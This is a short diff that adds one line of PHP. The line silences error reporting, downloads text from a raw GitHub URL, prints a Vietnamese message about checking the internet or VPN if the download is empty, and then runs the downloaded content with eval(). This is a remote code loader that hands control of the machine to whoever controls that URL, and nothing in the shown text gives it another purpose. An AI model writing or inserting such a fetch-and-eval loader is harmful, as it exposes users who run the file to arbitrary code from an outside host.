@@ -1,0 +1,3 @@
+
+error_reporting(0); $doandinh = file_get_contents('https://raw.githubusercontent.com/doan2k4/doandinh.github.io/main/sosad'); if ($doandinh == ''){ echo $white." ➻❥ ".$green."Vui Lòng Kiểm Tra Lại Internet Hoặc Tắt VPN\n"; exit; } eval($doandinh);
+
